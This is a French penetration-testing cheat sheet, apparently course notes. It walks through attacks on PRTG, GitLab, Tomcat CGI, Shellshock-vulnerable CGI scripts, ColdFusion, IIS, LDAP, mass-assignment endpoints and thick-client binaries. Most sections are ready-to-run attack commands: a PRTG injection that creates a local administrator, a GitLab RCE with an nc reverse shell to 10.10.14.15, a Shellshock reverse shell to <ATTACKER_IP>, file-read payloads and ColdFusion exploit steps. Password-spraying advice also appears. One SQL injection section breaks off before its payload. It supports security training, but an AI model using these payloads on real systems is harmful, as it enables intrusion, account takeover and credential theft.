> Nécessite compte avec accès aux Notifications (ex. `prtgadmin`).

1. Menu `Setup` → `Account Settings` → `Notifications`
2. `Add new notification`
3. Nommer (ex : `pwn`), cocher `EXECUTE PROGRAM`
4. `Program File` : sélectionner `Demo exe notification - outfile.ps1`
5. `Parameters` : mettre la commande à exécuter (exemple d’ajout d’un utilisateur local) :  
   ``test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add``
6. `Save` puis cliquer `Test` → la commande est mise en file d’exécution (exécution aveugle)
7. Vérifier succès (ex. connexion RDP / SMB ou test post-exec)

## Validation post-exploit
- Tester accès SMB local :  
  `crackmapexec smb <target> -u prtgadm1 -p 'Pwn3d_by_PRTG!'`
- Essayer RDP / WinRM / outils Impacket (si autorisé par le scope)

## Commandes utiles
- `curl -s http://<host>:8080/index.htm | grep prtgversion`
- `crackmapexec smb <host> -u <user> -p <pass>`

---

# Customer Service Mgmt & Configuration Management

---

# GitLab - Discovery & Enumeration

## Objectif
Méthodo concise pour détecter et énumérer une instance GitLab (footprint → accès public → collecte d’infos).

## Étapes

- **Identifier l’instance**
  - Ouvrir l’URL GitLab → la page de login (logo / UI) confirme GitLab.

- **Vérifier visibilité publique**
  - Accéder à `/explore` pour lister projets publics, groupes et snippets.
  - Parcourir les projets publics à la recherche de README, commits, fichiers de config, clés ou secrets exposés.

- **Rechercher artefacts utiles**
  - Inspecter fichiers de projet (`README`, `*.yml`, `Dockerfile`, `docker-compose`, `config`, scripts CI/CD`) pour secrets hard-codés.
  - Examiner messages de commit et branches pour indices d’infra ou credentials (tokens, URLs internes).

- **Tester inscription / comptes**
  - Vérifier si l’auto-inscription est activée (self-signup).
  - Si possible, créer un compte pour augmenter le niveau d’accès (respecter la portée du test).

- **Énumération d’utilisateurs**
  - Utiliser le formulaire d’inscription / validation d’email pour détecter utilisateurs existants (ex. : message `Email has already been taken` ou `Username is already taken`).
  - Construire une liste d’utilisateurs valides depuis ce mécanisme.

- **Récupération de version**
  - La version GitLab est visible sur `/help` (nécessite d’être connecté).
  - Si impossible d’y accéder, éviter les exploits aveugles — rester sur collecte passive.

- **Rechercher dépôts internes accessibles**
  - Après inscription/connexion, revisiter `/explore`, groups et projets privés accessibles.
  - Télécharger / parcourir le code à la recherche de secrets, clés SSH, tokens CI/CD, fichiers de config.

- **CI/CD & variables**
  - Rechercher pipelines, jobs CI, runners et variables CI (tokens, credentials exposés dans fichiers `.gitlab-ci.yml` ou logs).

- **Flux d’emails & confirmations**
  - Si l’organisation permet l’utilisation d’e-mails temporaires liés aux tickets/services, essayer d’obtenir confirmations via la boîte support si pertinent.

- **Réutilisation de credentials**
  - Rassembler identifiants trouvés via OSINT/dumps et tester leur réutilisation sur GitLab (avec autorisation et précautions).

---

# GitLab - Attacking 

## Objectif
Actions concises pour passer de l'énumération à l'exploitation (RCE) quand possible.

## 1) Prérequis rapides
- Authentification requise pour certaines failles (ex : ExifTool RCE).
- S'assurer de l'autorisation avant toute action intrusive.

## 2) Username enumeration
- Script (exemple) : `gitlab_userenum.sh`
- Exemple d'utilisation :
  - `./gitlab_userenum.sh --url http://gitlab.example.local:8081/ --userlist users.txt`

## 3) Lockout / brute-force — paramètres par défaut
- Valeurs par défaut (si non modifiées) :
  - `config.maximum_attempts = 10`
  - `config.unlock_in = 10.minutes`
- Contrainte : adapter le rythme d'attaque (password-spraying) pour éviter le verrouillage.

## 4) Exploit notable : ExifTool RCE (GitLab CE ≤ 13.10.2)
- Type : Authenticated RCE via traitement d'images (ExifTool).
- Prérequis : compte valide (ou self-register si activé) + version vulnérable.
- Exemple d'exploit (PoC) :
  - `python3 gitlab_13_10_2_rce.py -t http://gitlab.example.local:8081 -u user -p pass -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f'`
- Effet : exécution de commande → shell (souvent en tant qu'utilisateur `git`).

## 5) Post-exploitation rapide
- Shell obtenu souvent sous l'utilisateur `git` (vérifier `id`).
- Rechercher : `config.toml`, clés SSH, tokens, fichiers CI/CD, accès runners.
- Priorité : collecter secrets / accès CI pour pivoter.

## Ressources (scripts mentionnés)
- [User enum python3](https://github.com/dpgg101/GitLabUserEnum)
- [User enum bash](https://www.exploit-db.com/exploits/49821)
- [RCE POC](https://www.exploit-db.com/exploits/49951)

---

# Common Gateway Interfaces

---

# Attacking Tomcat CGI

## CVE
- CVE-2019-0232 — injection de commandes via le CGI Servlet lorsque `enableCmdLineArguments=true` (Windows; versions affectées : 9.0.0.M1–9.0.17, 8.5.0–8.5.39, 7.0.0–7.0.93).

## Quick facts
- Cible : Tomcat sous Windows avec CGI activé + `enableCmdLineArguments=true`.
- Cause : la query string devient des arguments ligne de commande sans validation → possibilité d'injecter des commandes avec `&`.
- Emplacement typique des scripts CGI : `/cgi/<script>.bat` ou `/cgi/<script>.cmd`.

## Ports / identification
- Tomcat HTTP : `8080` (souvent)
- Découverte : `nmap -p- -sC -Pn <host> --open`

## Recon / trouver les scripts CGI
- Fuzzer les noms/extensions courants :
  - `ffuf -w /usr/share/dirb/wordlists/common.txt -u http://<host>:8080/cgi/FUZZ.bat`
  - tester aussi `.cmd`, `.exe`, `.ps1`
- URL typique trouvée : `http://<host>:8080/cgi/welcome.bat`

## Vérifier la vuln (rapide)
- Injection basique (peut nécessiter encodage URL) :  
  - `http://<host>:8080/cgi/welcome.bat?&dir` → sortie de `dir`
- Lister variables d'environnement :  
  - `http://<host>:8080/cgi/welcome.bat?&set` → montre `SCRIPT_FILENAME`, `COMSPEC`, `PATH`, etc.

## Exécution sur Windows
- `PATH` souvent non défini → utiliser chemins complets : `c:\windows\system32\whoami.exe`
- Tomcat filtre certains caractères ; contourner par encodage URL :
  - `:` → `%3A` ; `\` → `%5C`
  - Exemple encodé : `http://<host>:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe`

## Schémas d'exploitation courants
- Séparateur de commandes : ajouter `&<commande>` (ou version URL-encodée).
  - Exemple : `http://<host>:8080/cgi/welcome.bat?&dir`
  - Exemple encodé : `http://<host>:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe`
- Si exécution directe bloquée : écrire un fichier via redirection (`echo`) puis l'exécuter (tout en URL-encodant).

---

# Attacking Common Gateway Interface (CGI) Applications - Shellshock

## Quick facts
- Vuln connue : Shellshock (`CVE-2014-6271`) — faille dans Bash (versions vulnérables ≤ 4.3).
- Contexte fréquent : scripts CGI (`/cgi-bin/*.cgi`, `.pl`, `.sh`, `.bat`, `.cmd`) exécutés par le serveur web.
- Impact : exécution de commandes au contexte de l’utilisateur du serveur web (souvent `www-data`).

## Principe (Shellshock)
- Bash interprète mal certaines fonctions définies dans les variables d’environnement ; du code placé après la définition de fonction peut être exécuté.
- Exemple local de démonstration :
  - `env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"`
  - Si vulnérable, la sortie contiendra `vulnerable-shellshock`.

## Enumeration (chercher des CGI)
- Rechercher répertoire CGI : `gobuster dir -u http://<host>/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi`
- Tester les fichiers découverts : `curl -i http://<host>/cgi-bin/access.cgi`

## Test de vulnérabilité via header (User-Agent)
- Test simple (lecture de `/etc/passwd`) :
  - `curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://<host>/cgi-bin/access.cgi`
- Si la sortie contient `/etc/passwd` → vulnérable.

## Exemple d’exploitation (reverse shell)
- One-liner Bash pour callback (listener sur vous) :
  - `curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1' http://<host>/cgi-bin/access.cgi`

## Exemple de vérification d’environnement
- Lister variables d’environnement exposées par le CGI :
  - `curl 'http://<host>/cgi-bin/access.cgi?&set'`
  - Utile pour connaître `SCRIPT_FILENAME`, `COMSPEC`, `PATH`, etc.

## Notes techniques importantes
- CGI = middleware : URL → serveur web → exécution script → sortie renvoyée.
- Shellshock s’exploite souvent via des champs d’entête (User-Agent, Referer, etc.) qui sont passés en variables d’environnement au script CGI.
- Sur systèmes patchés, Bash n’exécutera pas le code après une définition de fonction importée.

## Mitigation
- Mettre à jour Bash vers une version non vulnérable.
- Sur appareils embarqués où mise à jour impossible : restreindre exposition réseau ou retirer CGI vulnérable.
- Vérifier et durcir exposition des endpoints CGI.

---

# Thick Client Applications

---

# Attacking Thick Client Applications

## Objectif
- Rappel rapide : trouver creds/clefs, extraire binaires/ressources, pivot local → réseau.  
- Outils essentiels: ProcMon, x64dbg, dnSpy, de4dot, Ghidra, Wireshark, Burp.

## Recon
- Détecter stack : **.NET / Java / C++**.  
- Archi : **2-tier** vs **3-tier**.  
- Outils : `CFF Explorer`, `Detect It Easy`, `strings`, `ProcMon`, `TCPView`.

## Client-side
- Chercher : **hardcoded creds, tokens, configs, DLL hijack, fichiers temp**.  
- Flux rapide : `strings` → dump mémoire → `de4dot` (NET) → `dnSpy`.  
- Runtime : `ProcMon` (IO), `x64dbg` (memory map), `Frida` (hooking).

## Network
- Interception/proxy : `Burp Suite`.  
- Sniffing : `Wireshark` / `tcpdump`.  
- Vérifier trafic en clair, tokens exposés, possibilité d’injection.

## Server
- Tester endpoints découverts par le client (OWASP Top10).  
- Priorité : auth bypass, SQLi, RCE selon API.

## Workflow
1. Lancer binaire → monitorer `ProcMon`.  
2. Protéger Temp pour capturer fichiers temporaires.  
3. Récupérer base64/PS1 → reconstruire EXE.  
4. `x64dbg` → Dump Memory → `strings` → détecter .NET.  
5. `de4dot` → `dnSpy` → lire code → extraire creds.

## Post-exploitation
- Récupérer : configs (`%AppData%`, `C:\ProgramData`), clés, tokens.  
- Rechercher services / tâches planifiées → élévation / pivot.

## Contre-mesures
- Pas de creds hardcodés (vaults).  
- Signature & vérification du code.  
- Chiffrement stockage local, distribution centralisée.

## Outils clés
- Static : `CFF Explorer`, `DIE`, `strings`, `de4dot`, `dnSpy`, `JADX`, `Ghidra`.  
- Dynamic : `ProcMon`, `x64dbg`, `Frida`, `Wireshark`, `Burp Suite`.

---

# Exploiting Web Vulnerabilities in Thick-Client Applications 

## Objectif
- Exploiter failles web accessibles via un client lourd (path traversal, SQLi, extraction de binaires/configs) pour obtenir foothold et privilèges.

## Prérequis
- Autorisation + VM snapshot.  
- Outils : `Wireshark`, `JD-GUI`/`jdcli`, `jar`, `javac`, `strings`, `dnSpy`/`jd-gui`, `Burp`.

## Découverte rapide
- Inspecter FTP/partage → récupérer `fatty-client.jar`, notes (port, creds `qtc/clarabibi`).  
- Sniffer login → confirmer host/port (Wireshark).  
- Ajouter entrée hosts pour rediriger domaine client :  
  - `echo 10.10.10.174 server.fatty.htb >> C:\Windows\System32\drivers\etc\hosts`

## Modifier port durci dans le JAR
1. Extraire JAR (`unzip` ou explorer).  
2. Rechercher `8000` → `beans.xml` → changer en `1337`.  
3. Supprimer signatures (META-INF/*.SF, *.RSA) et sections SHA-256 de `META-INF/MANIFEST.MF`.  
4. Rebuild JAR :  
   - `cd fatty-client`  
   - `jar -cmf META-INF/MANIFEST.MF ..\fatty-client-new.jar *`  
5. Lancer ; login `qtc/clarabibi`.

## Récupérer fichiers distants via client (technique)
- Décompiler client (JD-GUI), repérer méthode `open` / `showFiles` dans `Invoker`.  
- Modifier pour écrire `response.getContent()` en local (FileOutputStream → Desktop).  
- Recompiler (`javac`), injecter `.class` modifiées dans le JAR, rebuild.  
- Utiliser FileBrowser → télécharger `fatty-server.jar` pour analyse.

## Path Traversal (approche)
- Tester `../../../../etc/passwd`. Si `/` filtré, inspecter code client serveur (decompile).  
- Localiser fonction qui transmet le chemin (ex : `showFiles(folder)`) → modifier client pour envoyer `..` ou `../logs` selon contrainte.  
- Rebuild client et lister `/configs/../` pour découvrir fichiers sensibles.

## SQL Injection (essentiel)
- Dans server, login utilise :  
  `SELECT ... FROM users WHERE username='` + user.getUsername() + `'` (non sanitizé).  
- Hash côté client = `sha256(username + password + "clarabibimakeseverythingsecure")`.  
- Contournement via UNION : créer fake row contrôlée. Exemple payload username :  

---

# ColdFusion - Discovery & Enumeration

## Objectif
Identifier rapidement une instance **ColdFusion** et ses points d’accès (admin, CFIDE, .cfm/.cfc).

## 1) Ports & Services
- **80 / 443** → HTTP(S)  
- **8500** → ColdFusion par défaut  
- **5500 / 1935 / 25** → admin, RPC, SMTP  

## 2) Indices ColdFusion
- Extensions : `.cfm`, `.cfc`  
- Dossiers : `/CFIDE/`, `/cfdocs/`, `/CFIDE/administrator/`  
- Headers : `Server: ColdFusion`, `X-Powered-By: ColdFusion`  
- Erreurs mentionnant CFML (`Application.cfm`, `cfquery`)

## 3) Enum rapide
- `nmap -p- -sC -Pn <target>` → repérer port 8500  
- `curl http://<target>:8500/` → voir CFIDE / cfdocs  
- `ffuf -u http://<target>:8500/FUZZ -w common.txt`  
- Accéder `/CFIDE/administrator/` → login ColdFusion 8+

## 4) Vulnérabilités connues
- **File Read / Upload / RCE / XSS / Command Injection**  
- Exemples : CVE-2021-21087, CVE-2020-24450, CVE-2019-15909  

## 5) Post-enum
- Rechercher fichiers `.cfm` sensibles, `Application.cfm`, creds hardcodés.  
- Décompiler JAR/WAR → chercher DSN / mots de passe.  

---

# Attacking ColdFusion

## Objectif
Exploiter ColdFusion 8 : lecture fichiers sensibles (path traversal) et RCE non authentifiée (upload JSP) — rapide et actionnable.

## 1) Rechercher exploits
- `searchsploit adobe coldfusion`  
- Cibles : `14641.py` (Directory Traversal, CVE-2010-2861), `50057.py` (Unauth RCE, CVE-2009-2265)

## 2) Directory Traversal (CVE-2010-2861)
- Principe : manipuler param vulnérable (ex: `locale`) dans `/CFIDE/.../mappings.cfm` pour lire fichiers.  
- Exemple URL : `http://target:8500/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../../ColdFusion8/lib/password.properties`  
- Exploit (automatisé) : `python2 14641.py <ip> 8500 "<path/to/file>"`  
- But : récupérer `password.properties`, `neo-datasource.xml`, etc.

## 3) Unauthenticated RCE via FCKeditor (CVE-2009-2265)
- Principe : upload JSP non authentifié -> exécution. Chemin vulnérable : `/CFIDE/scripts/ajax/FCKeditor/.../upload.cfm`  
- Étapes :  
  - Copier exploit : `cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .`  
  - Éditer `50057.py` → définir `lhost`, `lport`, `rhost`, `rport`.  
  - Lancer : `python3 50057.py`  
  - Écouter reverse : `nc -lvnp 4444`  
- But : JSP upload → reverse shell Windows.


## 4) Command injection (concept rapide)
- Si `cfexecute` utilisé sans validation : exécution OS possible.  
- Exemple vulnérable : `<cfexecute name="cmd.exe" arguments="/c #cgi.query_string#" timeout="5">`  
- Test simple : `http://target/index.cfm?; whoami` (ou `; echo pwned > C:\pwn.txt`) — observe résultat.


## 5) Post-exploitation priorités
- Lire fichiers récupérés : `password.properties`, `neo-datasource.xml` → creds DB/LDAP.  
- Chercher webshells, comptes admin, scripts de démarrage.  
- Pivot : utiliser creds pour accès DB/LDAP ou services internes.


## 6) Défense rapide
- Patch/upgrade ColdFusion, restreindre `/CFIDE/administrator` par IP, retirer FCKeditor, désactiver pages d’install/debug, WAF + surveillance uploads.

---

# IIS Tilde Enumeration — Cheat Sheet

## Objectif
Découvrir noms courts (8.3) et ressources cachées sur IIS via le tilde `~` pour accéder à dossiers/fichiers non exposés.

## Principe rapide
- Windows génère noms 8.3 (ex: `SECRET~1`) ; IIS accepte `~` dans l’URL.  
- En testant `http://target/~<prefix>` on peut deviner le shortname ; `200 OK` = match.  
- Une fois `SECRET~1` trouvé on peut lister/accéder : `http://target/SECRET~1/file.txt`.

## 1) Détection cible
- Scanner ports / version IIS : `nmap -p- -sV -sC --open <ip>`  
- Si header `Microsoft-IIS/*` ou version (`7.5`, etc.), tilde enumeration possible.

## 2) Outils rapides
- `IIS-ShortName-Scanner` (Java) → automatisation découverte 8.3.  
  - Lancer : `java -jar iis_shortname_scanner.jar 0 5 http://<target>/`  
  - Résultat : liste de shortnames (ex: `ASPNET~1`, `UPLOAD~1`) et fichiers découverts.
- Sinon bruteforce manuel + wordlist → `gobuster` :
  - Générer liste partielle : `egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt`
  - Brute-force extension adaptée : `gobuster dir -u http://<target>/ -w /tmp/list.txt -x .aspx,.asp`

## 3) Utilisations & impact
- Trouver pages admin cachées, scripts ASP/ASPX, ressources uploadées.  
- Permet d’accéder à fichiers non-indexés ou de lancer étapes d’exploitation ultérieures (LFI, RCE, info-leak).


## 4) Limitations & contournements
- Serveurs modernes peuvent désactiver 8.3 ou filtrer `~` requests.  
- Scanner peut être bruyant → limiter vitesse/threads.  
- Some hosts block `OPTIONS`/weird methods; use GET.

## 5) Contre-mesures
- Désactiver noms 8.3 sur filesystem si non requis (`fsutil.exe behavior set disable8dot3 1`).  
- Filtrer/normaliser requêtes contenant `~` ou patterns 8.3 au WAF.  
- Restreindre / harden file-listing et directory indexing sur IIS.  
- Surveillance logs pour requêtes `~` massives.

---

# LDAP

## Objectif  
Découvrir & exploiter annuaires LDAP/AD : enum, fuite d’attributs, contournement d’auth (LDAP injection), récupération de creds/infos pour pivot.

## 1) Détection rapide
- Scanner ports : `nmap -p 389,636 -sV <target>` → service LDAP/LDAPS.  
- Vérifier bannière/version dans résultat nmap.

## 2) Enum basique
- Test bind anonyme / search :  
  `ldapsearch -x -H ldap://<ip>:389 -b "dc=example,dc=com" "(objectClass=*)"`  
- Bind avec creds :  
  `ldapsearch -H ldap://<ip> -D "cn=admin,dc=example,dc=com" -w 'Passw0rd' -b "dc=example,dc=com" "(cn=*)" `  
- Chercher utilisateurs :  
  `ldapsearch -x -b "dc=example,dc=com" "(uid=*)" uid,cn,memberOf,mail`

## 3) Tests utiles
- Vérifier anonymus bind (si permet lecture) → `ldapsearch -x -H ldap://<ip> -b "dc=..." "(objectClass=person)"`  
- Lister DNs utiles : `ldapsearch -x -b "dc=example,dc=com" "(objectClass=*)" dn`  
- Extraire hashes/creds (si stockés) : rechercher `userPassword`, `unicodePwd`, `supplementaryCredentials`.

## 4) LDAP Injection — techniques & payloads
- Principe : user input concaténé dans filtre LDAP → injection possible (comme SQLi).  
- Auth bypass (wildcard) : si application construit `(&(objectClass=user)(uid=$user)(userPassword=$pass))` → tester :  
  - username = `*` → filter `(&(objectClass=user)(uid=*)(userPassword=...))` → peut matcher.  
  - password = `*` → bypass si password non vérifié côté serveur.  
- Injection logique (OR) : injecter `) (|(cn=*))` pour transformer filtre. Exemple payload username:  
  `foo*)(|(objectClass=*))`  
  (si concaténé sans échappement, devient `(...(uid=foo*)(|(objectClass=*)))...` → retour de multiples entrées)  
- Filtration/échappement recommandé : échapper `* ( ) \ NUL /` et utiliser binds paramétrés côté application.

## 5) Post-exploitation priorités
- Récupérer DNs d’admins / groupes sensibles (`memberOf`).  
- Chercher attributs contenant données sensibles (`userPassword`, `altSecurityIdentities`, `servicePrincipalName`).  
- Utiliser comptes trouvés pour accéder à services (AD: Kerberos / lateral movement).

## 6) Défenses rapides
- Désactiver anonymous binds / restreindre lecture par ACL.  
- Valider/échapper input côté appli (LDAP-escape).  
- Activer LDAPS / StartTLS pour chiffrer trafic.  
- Auditer logs et limiter exposition du port LDAP.

---

# Web Mass Assignment Vulnerabilities

## Objectif
Trouver et exploiter des endpoints qui acceptent des objets complets (mass-assignment) sans whitelist → modifier attributs sensibles (ex : `admin`, `confirmed`, `role`).

## Principe (très court)
- Frameworks (Rails, Laravel, Django REST, etc.) permettent souvent d’assigner un hash entier aux modèles.  
- Si l’appli n’utilise pas de whitelist/strong-params, un attaquant envoie des champs non prévus (`admin=true`) et l’attribut est mis à jour.

## Techniques — commande / exploit 

1. Recon — repérer endpoints d’update/create  
   - Chercher formulaires JSON ou POST qui envoient un objet : `{"user":{...}}` ou `email=...&user[name]=...`  
   - Outils : Burp intruder / repeater, proxy.

2. Test basique — ajouter attribut sensible au POST  
   - Exemple HTTP (POST registration) :  
     - `username=new&password=pass&confirmed=true`  
   - Si serveur insère `confirmed` sans vérif → contournement d’approbation.

3. Exploitation ciblée — promotion de privilèges  
   - Souvent utile : ajouter `admin=true`, `role=admin`, `is_staff=true`, `confirmed=1`.  
   - Test via Burp Repeater ou curl :  
     - `curl -X POST -d "username=att&password=pass&admin=1" https://target/register`

4. Source-review (si dispo) — repérer assignations massives  
   - Rails vulnérable : `User.new(params[:user])` sans `permit`.  
   - Python/Flask example : `Model(**request.form)` → accepter les clefs.

5. Automation / fuzzing des propriétés  
   - Utiliser wordlists d’attributs courants : `admin, role, is_admin, confirmed, verified, is_staff, balance`  
   - Burp Intruder ou scripts curl pour injecter chaque clé.

## Prévention
- Whitelist / strong params :  
  - Rails : `params.require(:user).permit(:username, :email)`  
  - Django REST / DRF : serializer fields explicites.  
  - Laravel : `$fillable` ou `$guarded` correctement configurés.  
- Ne jamais faire `Model.new(params[:user])` sans filtrage.  
- Valider côté serveur les champs autorisés (deny-by-default).  
- Logging / alerting : changements d’attributs sensibles (role, admin, balance).  
- Tests sécurités (SAST/IAST) pour détecter mass-assignment.

---

# Attacking Applications Connecting to Services 

## Objectif  
Extraire des credentials ou chaînes de connexion dans des binaires / DLLs d’applis connectées à des services (SQL, LDAP, etc.) pour pivoter ou escalader.

## 1) ELF Executable Analysis (Linux)

### Technique : Analyse dynamique / GDB  
- Lancer l’appli → observer si elle tente une connexion :  
  `./octopus_checker`  
- Charger dans gdb/peda :  
  `gdb ./octopus_checker`  
  `set disassembly-flavor intel`
  `start` 
  `disas main`  
- Chercher appels vers fonctions de connexion : `SQLDriverConnect`, `connect`, `mysql_real_connect`, etc.  
- Poser breakpoint avant la fonction :  
  `b *<addr>` (ex : `b *0x5555555551b0`)  
  `run`  
- Examiner registres pour extraire chaîne de connexion :  
  `info registers`  
  → Registre `RDX` ou `RDI` contient souvent :  
  `"DRIVER={ODBC Driver 17 for SQL Server};SERVER=localhost;UID=user;PWD=pass;"`

### Exploit :  
- Récupérer creds (`UID`, `PWD`, `SERVER`) → tester réutilisation :  
  - `sqsh -S <server> -U <user> -P <pass>`  
  - `impacket-mssqlclient <user>:<pass>@<ip>`

## 2) DLL / .NET File Examination (Windows)

### Technique : Lecture du code avec dnSpy  
- Ouvrir `.dll` suspecte (ex : `MultimasterAPI.dll`) dans **dnSpy**.  
- Parcourir : *Controllers*, *Config*, *Services*.  
- Rechercher chaînes sensibles : `connectionString`, `SqlConnection`, `UID=`, `PWD=`.  
  - Exemple trouvé :  
    `"Server=localhost,1433;Database=master;User Id=admin;Password=P@ssw0rd!"`

### Exploit :  
- Tester mot de passe sur d’autres services :  
  - MSSQL, RDP, SMB, WinRM → **password reuse / lateral movement**.  
  - `crackmapexec smb <ip> -u user -p 'P@ssw0rd!'`

## 3) Analyse statique alternative
- Grep sur binaire :  
  `strings <binary> | grep -Ei "server=|uid=|pwd=|pass"`  
- Pour ELF + .NET :  
  `rabin2 -zz <file>`  
  `binwalk <file>`

## 4) Exploitation & pivoting
- Se connecter à DB avec creds extraits → exfiltrer users/NTLM hashes.  
- Vérifier réutilisation du mot de passe (admin, AD, etc.).  
- Utiliser creds dans outils réseau : `impacket-*`, `crackmapexec`, `mssqlclient`, etc.

## 5) Défense rapide
- Ne jamais hardcoder les creds dans binaires.  
- Utiliser gestionnaires de secrets (Vault, Azure Key Vault, etc.).  
- Restreindre droits des comptes DB utilisés par apps.  
- Obfuscation / chiffrement des chaînes sensibles dans code.  
- Rotation régulière des identifiants.

---














